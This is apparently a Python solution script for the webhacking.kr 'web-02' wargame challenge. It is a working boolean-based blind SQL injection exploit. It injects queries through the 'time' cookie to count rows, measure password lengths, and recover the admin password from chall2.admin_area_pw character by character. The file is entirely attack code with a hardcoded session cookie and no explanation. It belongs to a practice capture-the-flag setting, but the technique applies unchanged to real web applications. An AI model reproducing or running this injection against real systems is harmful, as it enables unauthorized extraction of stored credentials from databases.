import requests

url = "https://webhacking.kr/challenge/web-02/"

datas = 0
while True:
    cookies = {'PHPSESSID': 'r9qrd0teu3uhiaubfl9qfbuid7',
           'time':
               "(1<2) & (IFNULL((SELECT LENGTH(pw) FROM chall2.admin_area_pw LIMIT {0}, 1) > 0, 0))".format(datas)}

    req = requests.get(url=url, cookies=cookies)
    req = req.text
    if req.count("2070-01-01 09:00:00") != 0:
        break
    datas += 1
for count in range(0, datas):
    data = ""
    length = 0
        
    while True:
        cookies['time'] = "(1<2) & ((SELECT LENGTH(pw) FROM chall2.admin_area_pw LIMIT {0}, 1) = {1})".format(count, length)
        req = requests.get(url=url, cookies=cookies)
        req = req.text
        if req.count("2070-01-01 09:00:01") != 0:
            break
        length += 1
    for i in range(1, length+1):
        char = 126
        while True:
            cookies['time'] = "(1<2) & (ASCII(SUBSTR((SELECT pw FROM chall2.admin_area_pw LIMIT {0}, 1), {1}, 1)) = {2})".format(count, i, char)
            req = requests.get(url=url, cookies=cookies)
            req = req.text
            if req.count("2070-01-01 09:00:01") != 0:
                break
            char -= 1
        data += chr(char)
    print(data)   
